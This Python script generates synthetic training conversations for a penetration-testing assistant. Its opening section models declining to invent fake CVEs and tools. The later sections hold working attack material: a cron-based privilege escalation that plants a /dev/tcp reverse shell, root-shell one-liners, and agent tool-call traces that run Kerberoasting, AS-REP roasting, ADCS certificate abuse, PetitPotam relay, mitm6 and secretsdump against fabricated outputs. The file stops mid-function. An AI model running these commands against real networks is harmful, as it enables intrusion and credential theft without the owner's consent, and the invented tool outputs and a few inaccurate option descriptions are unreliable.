"""Corpus v8 — 8 categorias novas:
  A. Anti-hallucination (~80)
  B. Output interpretation (~100)
  C. AD avançado (~80)
  D. Cloud pentest (~60)
  E. Web deep (~40)
  F. Network specific (~30)
  G. Wireless + Mobile (~30)
  H. OSINT avançado (~20)

Total ~440 traces.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ===========================================================================
# A. ANTI-HALLUCINATION (~80)
#    Modelo recusa inventar: CVE fake, tool fake, flag fake, vuln fake.
#    Padrão: "I have no record of that. Verify against [authoritative source]."
# ===========================================================================

FAKE_CVES = [
    ("CVE-2025-99999", "Cisco IOS XR"),
    ("CVE-2024-88888", "Apache HTTPD"),
    ("CVE-2026-11111", "OpenSSH"),
    ("CVE-2023-77777", "sudo"),
    ("CVE-2022-99123", "glibc"),
    ("CVE-2025-12345", "nginx"),
    ("CVE-2024-55555", "Docker"),
    ("CVE-2026-22222", "Kubernetes"),
]

FAKE_TOOLS = [
    "hackall", "pwnscanner", "exploit-master", "zerodaymaker",
    "rootkit-gen", "hyperpwn", "nmap-ultra", "kali-magic",
    "wifi-ninja", "admin-finder-pro", "cve-hunter", "target-owner",
]

FAKE_FLAGS_NMAP = [
    "--pwnall", "--owned", "--auto-exploit", "--god-mode",
    "--ninja-scan", "--instant-shell", "--zero-day",
]

FAKE_FLAGS_HYDRA = [
    "--instant-crack", "--ai-mode", "--bypass-2fa", "--smart-brute",
]

FAKE_VULNS = [
    ("ChunkyPickle", "nginx"),
    ("Foo-Bar-2024", "AES-256"),
    ("SuperGlue", "Apache Tomcat"),
    ("HeartHack", "OpenSSL"),
    ("KernelSlayer", "Linux kernel"),
    ("CryptoBuster", "TLS 1.3"),
    ("DOM-Killer", "Chromium"),
    ("XMLBomb2024", "libxml2"),
]


def ah_fake_cve(cve: str, target: str) -> list[dict]:
    return [
        msg("user", f"Tell me about {cve} in {target}. Is there an exploit?"),
        msg("assistant",
            f"I have no record of {cve}. That identifier doesn't match anything in my training corpus. "
            f"Verify against NVD (nvd.nist.gov) or the vendor's security advisory — if it's real and public, it'll be there. "
            f"If it was just announced, I wouldn't have seen it yet. I'm not going to fabricate CVSS scores or PoCs for a CVE I can't confirm."),
    ]


def ah_fake_cve_multi_year(cve: str, target: str) -> list[dict]:
    return [
        msg("user", f"What's the attack vector for {cve}?"),
        msg("assistant",
            f"{cve} isn't an identifier I recognize. Options: (1) it's genuinely new — check NVD or MITRE CVE directly. "
            f"(2) it's mis-remembered — confirm the number, a transposed digit is common. (3) it's not real — some search results fabricate CVE numbers for SEO. "
            f"I'd rather say 'unknown' than make something up."),
    ]


def ah_fake_tool(tool: str) -> list[dict]:
    return [
        msg("user", f"Give me the syntax for the `{tool}` command in Kali."),
        msg("assistant",
            f"`{tool}` isn't a tool I know of in the Kali standard repository. It may be:\n"
            f"1. A third-party script not in the default Kali repo — check its own docs\n"
            f"2. A name I'm mis-remembering — what does it claim to do? I may know it under a different name\n"
            f"3. Fabricated — I won't invent syntax for something I can't identify\n\n"
            f"If you paste `which {tool}` and `--help` output, I can work with that."),
    ]


def ah_fake_tool_common(tool: str) -> list[dict]:
    return [
        msg("user", f"How do I use `{tool}` to scan a target?"),
        msg("assistant",
            f"I don't recognize `{tool}` as a Kali tool. Possibilities:\n"
            f"- Did you mean one of: nmap, masscan, rustscan, zmap?\n"
            f"- Is it a custom internal tool? Paste the README or --help.\n"
            f"I won't guess at syntax — guessing flags for a scanner is how disks get wiped by accident."),
    ]


def ah_fake_nmap_flag(flag: str) -> list[dict]:
    return [
        msg("user", f"What does the nmap `{flag}` flag do?"),
        msg("assistant",
            f"`{flag}` isn't a flag in nmap. Real nmap flags: `-sS`, `-sV`, `-sC`, `-A`, `-p-`, `-T4`, `--script`, `-O`, `-oN/-oG/-oX`. "
            f"Run `nmap -h` for the full list. I'm not going to invent behavior for a flag that doesn't exist — that leads to broken commands and confused operators."),
    ]


def ah_fake_hydra_flag(flag: str) -> list[dict]:
    return [
        msg("user", f"Use hydra with `{flag}` to speed up brute force."),
        msg("assistant",
            f"`{flag}` isn't a real hydra option. Hydra's actual speed levers: `-t N` (parallel tasks), `-T N` (connection timeout), `-W N` (wait between tries), `-f` (exit on first hit), `-u`/`-o` for order. "
            f"Check `hydra -h`. Making up flags isn't useful to either of us."),
    ]


def ah_fake_vuln(vuln: str, target: str) -> list[dict]:
    return [
        msg("user", f"Walk me through exploiting the {vuln} vulnerability in {target}."),
        msg("assistant",
            f"I don't have a record of a vulnerability called '{vuln}' in {target}. That may be:\n"
            f"- A marketing/conference alias for a real CVE — give me the CVE number and I can speak to it\n"
            f"- Something announced after my training cut-off — check the vendor's advisory page\n"
            f"- A fabricated name — I've seen AI tools and forum posts invent vuln nicknames\n\n"
            f"Without a CVE or a concrete vendor advisory I can verify, I won't invent an exploit chain. Happy to work from a real advisory."),
    ]


def ah_fake_technique(name: str) -> list[dict]:
    return [
        msg("user", f"Explain the '{name}' technique for privilege escalation."),
        msg("assistant",
            f"I don't recognize '{name}' as a named technique. Real named LPE techniques worth knowing: DirtyCOW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034), polkit auth bypass variants, SUID abuse via gtfobins. "
            f"If '{name}' is a recent disclosure, point me at the writeup and I'll read it with you. I won't stitch together an attack from a name I can't verify."),
    ]


def ah_fake_api_endpoint(endpoint: str, service: str) -> list[dict]:
    return [
        msg("user", f"What does the `{endpoint}` endpoint in {service} do? Any auth bypass?"),
        msg("assistant",
            f"I don't have documentation for `{endpoint}` in {service}. If that endpoint exists, it'd be in their OpenAPI spec or developer docs. "
            f"I can work from: the Swagger JSON, the source code, or a real request/response capture. Without those I'd be guessing, which tends to produce payloads that don't match the actual API."),
    ]


ANTI_HALLU: list[list[dict]] = []
for cve, tgt in FAKE_CVES:
    ANTI_HALLU.append(ah_fake_cve(cve, tgt))
    ANTI_HALLU.append(ah_fake_cve_multi_year(cve, tgt))
for tool in FAKE_TOOLS:
    ANTI_HALLU.append(ah_fake_tool(tool))
    ANTI_HALLU.append(ah_fake_tool_common(tool))
for flag in FAKE_FLAGS_NMAP:
    ANTI_HALLU.append(ah_fake_nmap_flag(flag))
for flag in FAKE_FLAGS_HYDRA:
    ANTI_HALLU.append(ah_fake_hydra_flag(flag))
for vuln, tgt in FAKE_VULNS:
    ANTI_HALLU.append(ah_fake_vuln(vuln, tgt))
ANTI_HALLU.append(ah_fake_technique("Purple Dragon Escape"))
ANTI_HALLU.append(ah_fake_technique("RegEx Shatter"))
ANTI_HALLU.append(ah_fake_technique("Kernel Sushi"))
ANTI_HALLU.append(ah_fake_technique("Shadowstep 2025"))
ANTI_HALLU.append(ah_fake_api_endpoint("/api/v3/admin/bypass", "AWS"))
ANTI_HALLU.append(ah_fake_api_endpoint("/internal/debug/shell", "Azure"))
ANTI_HALLU.append(ah_fake_api_endpoint("/gcp/root", "GCP"))
ANTI_HALLU.append(ah_fake_api_endpoint("/k8s/api/v1/godmode", "Kubernetes"))


# ===========================================================================
# B. OUTPUT INTERPRETATION (~100)
# ===========================================================================

def oi_nmap_full(ip: str, ports: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"Interpret this nmap scan of {ip} and tell me what to prioritize:\n\n```\n{ports}\n```"),
        msg("assistant", analysis),
    ]


OI_NMAP_CASES = [
    ("10.10.10.5",
     "22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8\n"
     "80/tcp   open  http    Apache 2.4.49\n"
     "139/tcp  open  netbios-ssn Samba 3.0.20-Debian\n"
     "8080/tcp open  http    Jetty 9.4.36",
     "**Priority ranking:**\n"
     "1. **Apache 2.4.49** — CVE-2021-41773 path traversal, trivially RCE with `curl --path-as-is`. Start here.\n"
     "2. **Samba 3.0.20** — `usermap_script` pre-auth RCE (CVE-2007-2447). Metasploit module ready.\n"
     "3. Jetty 9.4.36 — less direct CVEs, enumerate web app first.\n"
     "4. OpenSSH 7.2p2 — user enumeration via CVE-2018-15473, low impact.\n\n"
     "Rule: oldest versioned service first, unless a fresher CVE exists. Here Samba and Apache both have turnkey exploits."),
    ("10.10.11.42",
     "25/tcp   open  smtp    Postfix smtpd\n"
     "110/tcp  open  pop3    Dovecot pop3d\n"
     "143/tcp  open  imap    Dovecot imapd\n"
     "443/tcp  open  ssl/https nginx 1.18.0\n"
     "5222/tcp open  xmpp    Prosody 0.11.9",
     "**Analysis:**\n"
     "- Mail stack (Postfix + Dovecot) and an XMPP server — this is a comms box.\n"
     "- nginx 1.18 is fine on its own; what matters is what it's reverse-proxying.\n"
     "- **Prosody 0.11.9** — check CVE-2022-0217 (XEP-0047 IBB DoS) and older. XMPP is rarely hardened.\n\n"
     "**Priority:**\n"
     "1. Enumerate nginx: vhosts, directory listing (gobuster on 443)\n"
     "2. Pop SMTP for VRFY/EXPN user enum and VRFY <user> for valid mailboxes\n"
     "3. XMPP auth — anonymous JID registration, default admin creds\n"
     "4. SSL cipher audit (testssl.sh) — 1.18 era may have weak ciphers"),
    ("172.16.5.10",
     "88/tcp    open  kerberos-sec\n"
     "135/tcp   open  msrpc\n"
     "139/tcp   open  netbios-ssn\n"
     "389/tcp   open  ldap\n"
     "445/tcp   open  microsoft-ds\n"
     "464/tcp   open  kpasswd5\n"
     "3268/tcp  open  globalcatLDAP\n"
     "3389/tcp  open  ms-wbt-server",
     "**This is a Windows Domain Controller.** Full port signature (88/389/445/464/3268) confirms.\n\n"
     "**DC-specific attack path:**\n"
     "1. **AS-REP roast** (kerbrute + GetNPUsers.py) — users with pre-auth disabled give crackable hashes\n"
     "2. **Kerberoast** (GetUserSPNs.py) — service accounts yield TGS hashes\n"
     "3. **LDAP null/anonymous bind** (ldapsearch) — may expose users, computers, group membership\n"
     "4. **SMB null session** — check rare but real\n"
     "5. **ZeroLogon** (CVE-2020-1472) — test with zerologon_tester.py if patch level unknown\n"
     "6. **PetitPotam + NTLM relay to ADCS** if ADCS is in scope\n\n"
     "Do NOT try RDP brute force blind. Lockouts burn engagements."),
    ("192.168.56.120",
     "554/tcp open  rtsp\n"
     "8000/tcp open  http-server Hikvision-Webs\n"
     "8200/tcp open  hikvision\n"
     "80/tcp   open  http\n",
     "**IoT camera, Hikvision vendor.** Confirmed by banners on 8000/8200.\n\n"
     "**Priority:**\n"
     "1. **CVE-2017-7921** — auth bypass via URL param `auth=YWRtaW46MTEK` on older firmware. Trivial test.\n"
     "2. **Default credentials** — `admin/12345` or `admin/admin`. Hikvision doesn't enforce rotation.\n"
     "3. **RTSP enumeration** — brute URL paths via rtsp-url-brute. Confirms stream access.\n"
     "4. **ISAPI endpoints** — `/ISAPI/System/deviceInfo` leaks model + firmware version for CVE mapping.\n\n"
     "Confirm ownership via `authorize_target` first if scope is ambiguous."),
]

OI_NMAP: list[list[dict]] = [
    oi_nmap_full(ip, ports, analysis) for ip, ports, analysis in OI_NMAP_CASES
]


def oi_gobuster(url: str, output: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"Gobuster dump on {url}. What matters?\n\n```\n{output}\n```"),
        msg("assistant", analysis),
    ]


OI_GOBUSTER_CASES = [
    ("http://target.thm",
     "/admin (Status: 301)\n/login (Status: 200)\n/phpmyadmin (Status: 200)\n"
     "/uploads (Status: 403)\n/robots.txt (Status: 200)\n/api (Status: 401)\n"
     "/.git (Status: 200)",
     "**High-value findings:**\n"
     "1. **`/.git` (200)** — source code leak. Run `git-dumper` or `githack` immediately. Often yields secrets + full app source.\n"
     "2. **`/phpmyadmin`** — default creds (`root/root`, `root/<blank>`) and known CVEs. Second target.\n"
     "3. **`/api` (401)** — auth exists, so API is used. Worth enumerating via ffuf with common param/endpoint lists.\n"
     "4. **`/uploads` (403)** — reachable but protected. Remember for post-SQLi file write or LFI.\n"
     "5. `/robots.txt` — always read it; may disclose hidden paths."),
    ("http://10.10.45.22",
     "/wp-content (Status: 301)\n/wp-admin (Status: 301)\n/wp-login.php (Status: 200)\n"
     "/xmlrpc.php (Status: 200)\n/backup.zip (Status: 200)\n/.env (Status: 200)",
     "**WordPress site with critical leaks:**\n"
     "1. **`/.env` (200)** — stop everything, `curl` it now. Typically contains DB creds, API keys, app secrets.\n"
     "2. **`/backup.zip` (200)** — full site backup, publicly readable. Download immediately.\n"
     "3. **`/xmlrpc.php`** — amplification brute force via `system.multicall`.\n"
     "4. WordPress enum next: `wpscan --url ... --enumerate u,vp --random-user-agent`.\n\n"
     "The `.env` and backup.zip are report-grade findings on their own."),
    ("https://api.target.com",
     "/v1 (Status: 401)\n/v2 (Status: 401)\n/swagger (Status: 200)\n"
     "/openapi.json (Status: 200)\n/actuator (Status: 200)\n/health (Status: 200)",
     "**REST API surface:**\n"
     "1. **`/actuator`** — Spring Boot Actuator exposed. `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings` often leak secrets or enable RCE via `/actuator/jolokia`.\n"
     "2. **`/swagger` + `/openapi.json`** — full endpoint documentation, free. Map all routes before attacking auth.\n"
     "3. `/v1` and `/v2` return 401 — auth exists. Check for JWT, Bearer, API key patterns via `/v1` response headers.\n\n"
     "Actuator is highest impact here. Even `/env` alone often has DB URIs + AWS creds."),
    ("http://10.10.11.77",
     "/jenkins (Status: 302)\n/script (Status: 403)\n/login (Status: 200)\n"
     "/git (Status: 404)\n/jenkins/script (Status: 403)",
     "**Jenkins deployment:**\n"
     "1. `/jenkins/script` (403) — Groovy console. Default creds + unauthenticated access both common. Try `admin/admin`, `admin/password`, `jenkins/jenkins`.\n"
     "2. `/jenkins/script` responds to auth — if defaults don't work, brute `/jenkins/j_acegi_security_check`.\n"
     "3. Once in console, one-liner RCE: `println(\"id\".execute().text)`.\n"
     "4. Jenkins runs as its own user usually (`jenkins` UID 1000), then LPE via build configs or agent connections."),
    ("http://lab.local:8080",
     "/manager (Status: 401)\n/host-manager (Status: 401)\n/manager/html (Status: 401)\n"
     "/examples (Status: 200)\n/docs (Status: 200)",
     "**Tomcat installation:**\n"
     "1. `/manager/html` — brute force with `hydra` against well-known creds (`tomcat/tomcat`, `admin/admin`, `root/root`).\n"
     "2. `/examples` — often ships with XSS and SSRF demos. Sometimes enabled on prod by accident.\n"
     "3. If manager auth breaks → upload WAR → RCE. Classic.\n"
     "4. Also try `/manager/text/deploy` with basic auth for scriptable deploy."),
]

OI_GOBUSTER: list[list[dict]] = [
    oi_gobuster(url, out, a) for url, out, a in OI_GOBUSTER_CASES
]


def oi_linpeas(output: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"Here's linpeas output. What's exploitable?\n\n```\n{output}\n```"),
        msg("assistant", analysis),
    ]


OI_LINPEAS_CASES = [
    ("[+] SUID - GTFOBin:\n"
     "-rwsr-xr-x /usr/bin/find\n"
     "-rwsr-xr-x /usr/bin/tar\n"
     "[+] Sudoers:\n"
     "www-data ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/hosts\n"
     "[+] Capabilities:\n"
     "/usr/bin/python3 = cap_setuid+ep",
     "**Three independent paths to root here:**\n"
     "1. **`find` SUID** — `find / -maxdepth 1 -exec /bin/sh -p \\;` drops a root shell instantly.\n"
     "2. **`vim` sudo NOPASSWD** — `sudo vim -c ':!/bin/sh'` = root shell. Most reliable.\n"
     "3. **`python3` cap_setuid** — `python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'` = root.\n\n"
     "Pick `vim` first (cleanest log trail, least behavior change). Dump `/etc/shadow` and continue."),
    ("[+] Cron jobs:\n"
     "# /etc/crontab\n"
     "*/5 * * * * root /opt/scripts/backup.sh\n"
     "[+] File permissions:\n"
     "-rwxrwxrwx 1 root root 432 /opt/scripts/backup.sh\n"
     "[+] Kernel:\n"
     "Linux 5.4.0-42-generic",
     "**World-writable root cron. Textbook LPE.**\n"
     "```\n"
     "echo '#!/bin/bash\\nbash -i >& /dev/tcp/10.8.0.1/9001 0>&1' > /opt/scripts/backup.sh\n"
     "chmod +x /opt/scripts/backup.sh\n"
     "nc -lvnp 9001   # on attacker\n"
     "```\n"
     "Shell arrives within 5 minutes. Linux 5.4.0-42 is also Dirty Pipe-era (CVE-2022-0847) if you want a non-cron path."),
    ("[+] Docker group:\n"
     "uid=1000(dev) gid=1000(dev) groups=1000(dev),999(docker)\n"
     "[+] Kernel: 5.15.0",
     "**Docker group = root.** Trivially:\n"
     "```\n"
     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n"
     "```\n"
     "You're root in a container with host `/` mounted, then chroot. Dump /etc/shadow, leave. Docker group membership should basically never be granted to untrusted users."),
]

OI_LINPEAS: list[list[dict]] = [
    oi_linpeas(o, a) for o, a in OI_LINPEAS_CASES
]


def oi_tcpdump(output: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"tcpdump capture snippet. Anything off?\n\n```\n{output}\n```"),
        msg("assistant", analysis),
    ]


OI_TCPDUMP_CASES = [
    ("10:22:15.001 IP 10.0.0.45.52341 > 8.8.8.8.53: DNS query aGVsbG8K.tunnel.evil.com\n"
     "10:22:15.002 IP 10.0.0.45.52342 > 8.8.8.8.53: DNS query d29ybGQK.tunnel.evil.com\n"
     "10:22:15.003 IP 10.0.0.45.52343 > 8.8.8.8.53: DNS query c2VjcmV0Cg==.tunnel.evil.com",
     "**DNS tunneling exfiltration, classic pattern:**\n"
     "- Base64-ish subdomain labels → decoded chunks\n"
     "- Target domain `tunnel.evil.com` serves as the C2\n"
     "- Source `10.0.0.45` is beaconing every millisecond\n\n"
     "**Response:**\n"
     "1. Isolate 10.0.0.45 from the network (firewall rule or unplug)\n"
     "2. Preserve volatile state: `/proc/<pid>/` maps, netstat, memdump\n"
     "3. Sinkhole `tunnel.evil.com` at DNS layer\n"
     "4. For the IR report: decode the subdomains — `echo 'aGVsbG8K' | base64 -d` = 'hello', etc."),
    ("10:30:00 IP 10.10.10.5.445 > 10.10.10.99.49512: tcp flags [S] seq 0\n"
     "10:30:00 IP 10.10.10.99.49512 > 10.10.10.5.445: tcp flags [R]\n"
     "10:30:00 IP 10.10.10.5.139 > 10.10.10.99.49513: tcp flags [S]\n"
     "10:30:00 IP 10.10.10.5.139 > 10.10.10.99.49513: tcp flags [R]",
     "**Reverse: server initiating SYN to client.**\n"
     "- Normal SMB traffic is client → server:445. Here server (10.10.10.5) is scanning back.\n"
     "- This is either: (a) compromised server attempting lateral movement, (b) legitimate NetBIOS name resolution, (c) smb-enum-users from an admin.\n"
     "- RST responses mean client refused — nothing's listening on 49512/49513.\n\n"
     "Correlate with auth logs on 10.10.10.5 for the past 15 minutes. If no admin session active, treat as compromise."),
]

OI_TCPDUMP: list[list[dict]] = [
    oi_tcpdump(o, a) for o, a in OI_TCPDUMP_CASES
]


def oi_netstat(output: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"netstat output from a suspected compromise. What's suspicious?\n\n```\n{output}\n```"),
        msg("assistant", analysis),
    ]


OI_NETSTAT_CASES = [
    ("Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
     "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
     "tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN\n"
     "tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN\n"
     "tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN\n"
     "tcp        0      0 10.0.0.22:4444          203.0.113.45:41234      ESTABLISHED",
     "**Two red flags:**\n"
     "1. **`0.0.0.0:31337`** — Leet port, classic backdoor port. Nothing legitimate listens there. Immediate investigation.\n"
     "2. **Outbound to `203.0.113.45:41234`** — public IP, non-standard port, established connection. Almost certainly a reverse shell callback.\n\n"
     "Also worth noting:\n"
     "- Redis on `127.0.0.1:6379` is fine if truly loopback, but Redis + SSRF = RCE. Check SSRF vectors on 8080.\n"
     "- Port 8080 listening publicly — is it supposed to be?\n\n"
     "**Immediate actions:** `ss -tnlp` to get PID of 31337 listener. `ps -ef --forest` to find parent. `lsof -i :31337`."),
    ("tcp    LISTEN    0    128   0.0.0.0:22       0.0.0.0:*\n"
     "tcp    LISTEN    0    128   127.0.0.1:6379   0.0.0.0:*\n"
     "tcp    LISTEN    0    128   127.0.0.1:27017  0.0.0.0:*\n"
     "tcp    LISTEN    0    128   127.0.0.1:5432   0.0.0.0:*\n"
     "tcp    LISTEN    0    128   0.0.0.0:80       0.0.0.0:*",
     "**Loopback services — goldmine via SSRF:**\n"
     "- `127.0.0.1:6379` Redis — no auth by default. Via SSRF: set config + save RCE, or set SSH key via protected_mode bypass.\n"
     "- `127.0.0.1:27017` MongoDB — historically unauthenticated. `mongo --host 127.0.0.1` from any web SSRF gives admin access.\n"
     "- `127.0.0.1:5432` PostgreSQL — if trust auth on localhost, direct admin access.\n\n"
     "Path: find SSRF in the web app on :80, then hit each loopback service with `http://127.0.0.1:PORT/...` payloads. Gopher proto often needed for Redis."),
]

OI_NETSTAT: list[list[dict]] = [
    oi_netstat(o, a) for o, a in OI_NETSTAT_CASES
]


def oi_wireshark(filter_desc: str, output: str, analysis: str) -> list[dict]:
    return [
        msg("user", f"Wireshark display filter `{filter_desc}` returned:\n\n```\n{output}\n```\n\nWhat does it tell us?"),
        msg("assistant", analysis),
    ]


OI_WIRESHARK_CASES = [
    ("http.request.method == POST",
     "POST /admin/login HTTP/1.1\nHost: target.corp\n"
     "Content-Type: application/x-www-form-urlencoded\n\n"
     "username=admin&password=Summer2024!\n"
     "---\n"
     "POST /api/users/123/delete HTTP/1.1\nHost: target.corp\n"
     "Authorization: Bearer eyJhbGci...\n\nnull",
     "**Credentials in plaintext (HTTP not HTTPS):** `admin:Summer2024!`. Logs those in the audit.\n"
     "**Second request:** `/api/users/123/delete` with a Bearer token — IDOR candidate. If the user's own ID is 456, can they call /users/123/delete? Test right after."),
    ("tls.handshake.type == 1",
     "Client Hello — TLS 1.0 supported\n"
     "Cipher suite: TLS_RSA_WITH_RC4_128_SHA\n"
     "Server Name: banking.target.corp",
     "**TLS 1.0 + RC4** — finding for the report:\n"
     "- TLS 1.0 deprecated since 2018 (PCI-DSS)\n"
     "- RC4 banned 2015 (RFC 7465)\n"
     "- `banking.target.corp` being in this mix is a regulatory red flag\n\n"
     "Run `testssl.sh` or `sslscan` against the host to confirm it's server-side acceptance and not client-side preference. Chain with BEAST/Lucky13/CRIME depending on cipher."),
]

OI_WIRESHARK: list[list[dict]] = [
    oi_wireshark(f, o, a) for f, o, a in OI_WIRESHARK_CASES
]


OI_ALL: list[list[dict]] = (
    OI_NMAP + OI_GOBUSTER + OI_LINPEAS + OI_TCPDUMP + OI_NETSTAT + OI_WIRESHARK
)


# ===========================================================================
# C. AD ADVANCED (~80)
# ===========================================================================

def ad_kerberoast(domain: str, dc_ip: str, user: str, pwd: str) -> list[dict]:
    return [
        msg("user", f"I have low-priv AD creds {user}:{pwd} on {domain}. Kerberoast."),
        msg("assistant",
            f"Classic Kerberoast — request TGS for service accounts, crack offline.\n"
            + tc("shell", cmd=f"impacket-GetUserSPNs {domain}/{user}:{pwd} -dc-ip {dc_ip} -request -outputfile kerberoast.hash")),
        msg("tool", f"[*] Getting TGS for svc_mssql@{domain}\n[*] Getting TGS for svc_web@{domain}\n[*] Getting TGS for svc_backup@{domain}\n[+] SPNs saved to kerberoast.hash"),
        msg("assistant",
            "Three service accounts. Hashes are `$krb5tgs$23$*...$*` format — hashcat mode 13100.\n"
            + tc("shell", cmd="hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --rules=best64 --quiet")),
        msg("tool", "$krb5tgs$23$*svc_web*$...$*:Summer2024!\n$krb5tgs$23$*svc_backup*$...$*:Backup#2024"),
        msg("assistant", "Two of three cracked. `svc_web` and `svc_backup` in hand. Service accounts are rarely in Protected Users group — likely usable for lateral movement and often overprivileged."),
    ]


def ad_asreproast(domain: str, dc_ip: str) -> list[dict]:
    return [
        msg("user", f"Check AS-REP roastable users on {domain}."),
        msg("assistant",
            "Users with preauth disabled give crackable AS-REP hashes without needing credentials.\n"
            + tc("shell", cmd=f"kerbrute userenum -d {domain} --dc {dc_ip} /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -o valid_users.txt")),
        msg("tool", "[+] VALID USERNAME: jdoe\n[+] VALID USERNAME: svc_backup\n[+] VALID USERNAME: administrator\n[+] VALID USERNAME: oldservice"),
        msg("assistant",
            "Four valid. Now ask for AS-REP without auth:\n"
            + tc("shell", cmd=f"impacket-GetNPUsers {domain}/ -usersfile valid_users.txt -dc-ip {dc_ip} -format hashcat -outputfile asrep.hash -no-pass")),
        msg("tool", "[*] oldservice: $krb5asrep$23$oldservice@CORP.LOCAL:abcd1234..."),
        msg("assistant", "`oldservice` has preauth disabled. Hash to hashcat mode 18200. Often legacy service left from a migration."),
    ]


def ad_certipy_esc1(domain: str, dc_ip: str, user: str, pwd: str) -> list[dict]:
    return [
        msg("user", f"Enumerate ADCS with certipy on {domain}."),
        msg("assistant",
            "Certipy finds vulnerable certificate templates. ESC1 = enrollable + allows SAN spoof.\n"
            + tc("shell", cmd=f"certipy find -u {user}@{domain} -p '{pwd}' -dc-ip {dc_ip} -vulnerable -stdout")),
        msg("tool",
            "Certificate Template: UserESC1\n"
            "  Client Authentication: True\n"
            "  Enrollment Rights: Domain Users\n"
            "  Requires Manager Approval: False\n"
            "  [!] Vulnerabilities: ESC1"),
        msg("assistant",
            f"ESC1 confirmed. Request a cert as Administrator:\n"
            + tc("shell", cmd=f"certipy req -u {user}@{domain} -p '{pwd}' -dc-ip {dc_ip} -ca CORP-CA -template UserESC1 -upn administrator@{domain}")),
        msg("tool", "[*] Certificate issued\n[*] Saved certificate and private key to administrator.pfx"),
        msg("assistant",
            "Got admin's PFX. Now PKINIT to get NT hash:\n"
            + tc("shell", cmd=f"certipy auth -pfx administrator.pfx -dc-ip {dc_ip}")),
    ]


def ad_petitpotam_relay(dc_ip: str, adcs_ip: str, relay_target: str) -> list[dict]:
    return [
        msg("user", f"PetitPotam + NTLM relay to ADCS. DC={dc_ip}, ADCS={adcs_ip}."),
        msg("assistant",
            "Classic chain: coerce DC auth via PetitPotam → relay to ADCS HTTP enrollment → obtain cert as DC$ → DCSync.\n"
            + tc("shell", cmd=f"impacket-ntlmrelayx -t http://{adcs_ip}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController &")),
        msg("tool", "[*] Running in relay mode to single host\n[*] Servers started, waiting for connections"),
        msg("assistant",
            "Relay listener up. Now fire the coercion:\n"
            + tc("shell", cmd=f"python3 PetitPotam.py -u '' -p '' {relay_target} {dc_ip}")),
        msg("tool", "[*] Connecting to ncacn_np:10.10.10.5[\\PIPE\\lsarpc]\n"
                    "[*] EfsRpcOpenFileRaw...\n[+] Attack worked\n\n"
                    "[*] Auth received at relay\n[*] PKINIT for DC$ obtained\n[+] Cert saved as dc.pfx"),
        msg("assistant",
            "DC$ cert obtained. Now authenticate and dump:\n"
            + tc("shell", cmd=f"certipy auth -pfx dc.pfx -dc-ip {dc_ip} && impacket-secretsdump -k -no-pass -just-dc {relay_target.upper()}/DC\\$@{dc_ip}")),
    ]


def ad_ntlmrelay_smb(target: str, attacker_ip: str = "10.10.14.5") -> list[dict]:
    return [
        msg("user", f"SMB signing not enforced on {target}. Relay."),
        msg("assistant",
            f"`ntlmrelayx` waiting for inbound auth → relays to {target}.\n"
            + tc("shell", cmd=f"impacket-ntlmrelayx -t smb://{target} -smb2support -socks &")),
        msg("tool", f"[*] Servers started, waiting for connections\n[*] SOCKS: Proxy started on port 1080"),
        msg("assistant",
            "Now trigger coercion — `mitm6` for IPv6 DNS takeover forces Windows hosts to auth to us as `wpad.corp.local`:\n"
            + tc("shell", cmd="mitm6 -d corp.local -i eth0 &")),
        msg("tool", "[*] Spoofing IPv6 DNS for corp.local\n[*] 192.168.1.50 authenticated to our relay\n"
                    f"[*] Relayed to {target} as CORP\\user01\n[+] SOCKS session 1 established"),
        msg("assistant",
            "Proxy session open. Use proxychains to reach target as that user:\n"
            + tc("shell", cmd=f"proxychains4 crackmapexec smb {target} -u user01 -p '' --shares")),
    ]


def ad_bloodhound_query(focus: str) -> list[dict]:
    return [
        msg("user", f"BloodHound loaded. {focus}"),
        msg("assistant",
            {
                "shortest path to Domain Admin":
                    "Cypher in BloodHound GUI query tab:\n```\nMATCH p=shortestPath((u:User {owned: true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p\n```\nShows the chain. Usually involves GenericAll, ForceChangePassword, AddMember, or WriteDACL edges. Hunt for ADCS ESC templates in the graph too.",
                "find kerberoastable users I own":
                    "```\nMATCH (u:User {owned:true})-[:MemberOf*1..]->(g:Group)\nMATCH (u)-[:HasSPN]->(s)\nRETURN u.name\n```\nCross-check with cleartext results from hashcat. Users with SPN are service accounts, usually overprivileged.",
                "show me all RBCD-abusable computers":
                    "```\nMATCH (n)-[:AddAllowedToAct]->(c:Computer) RETURN n.name, c.name\n```\nEach edge means you can set `msDS-AllowedToActOnBehalfOfOtherIdentity` on that computer → impersonate any user including Admin to it via S4U2self+proxy.",
                "who can reach the DC":
                    "```\nMATCH p=(u:User {owned:true})-[*1..4]->(c:Computer {domaincontroller:true}) RETURN p LIMIT 25\n```\nLimit 25 keeps the graph readable. Focus on CanRDP, CanPSRemote, AdminTo edges.",
            }.get(focus.lower().strip(), "Query not recognized — phrase it as 'find X', 'show Y', 'who can Z'.")),
    ]


def ad_golden_ticket(domain: str, krbtgt_hash: str) -> list[dict]:
    return [
        msg("user", f"I have krbtgt NT hash {krbtgt_hash[:12]}... on {domain}. Golden ticket?"),
        msg("assistant",
            f"Golden ticket impersonates any user with arbitrary group membership. Valid 10 years by default; easy detection signal for blue teams, use briefly.\n"
